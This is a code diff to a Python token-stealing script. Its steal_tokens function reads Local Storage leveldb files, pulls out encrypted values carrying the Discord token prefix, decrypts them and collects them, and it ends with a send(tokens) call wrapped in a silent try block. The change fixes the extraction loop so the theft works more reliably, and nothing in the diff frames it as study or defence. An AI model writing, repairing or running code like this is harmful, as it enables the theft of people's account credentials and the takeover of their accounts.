@@ -1,4 +1,3 @@
-
 import os
 import re
 import json
@@ -47,18 +46,21 @@ def steal_tokens():
         key = get_key(path)
         if not key: continue
         
-        # Check Local Storage
         ls_path = os.path.join(path, "Local Storage", "leveldb")
         if os.path.exists(ls_path):
             for file_name in os.listdir(ls_path):
                 if file_name.endswith(".ldb") or file_name.endswith(".log"):
                     with open(os.path.join(ls_path, file_name), "r", errors="ignore") as f:
-                        for line in f.read().splitlines():
-                            for token in re.findall(r"dQw4w9WgXcQ:[^"]+", line):
-                                try:
-                                    decrypted = decrypt_val(base64.b64decode(token.split("dQw4w9WgXcQ:")[1]), key)
-                                    if decrypted: found_tokens.append(f"[{name}] {decrypted}")
-                                except: pass
+                        content = f.read()
+                        # Simpler token extraction to avoid regex syntax errors
+                        parts = content.split("dQw4w9WgXcQ:")
+                        for part in parts[1:]:
+                            token_str = part.split('"')[0].split("\\")[0]
+                            try:
+                                decrypted = decrypt_val(base64.b64decode(token_str), key)
+                                if decrypted and len(decrypted) > 50: 
+                                    found_tokens.append(f"[{name}] {decrypted}")
+                            except: pass
     return list(set(found_tokens))
 
 def send(tokens):
@@ -75,3 +77,4 @@ if __name__ == "__main__":
         send(tokens)
     except Exception:
         pass
+        
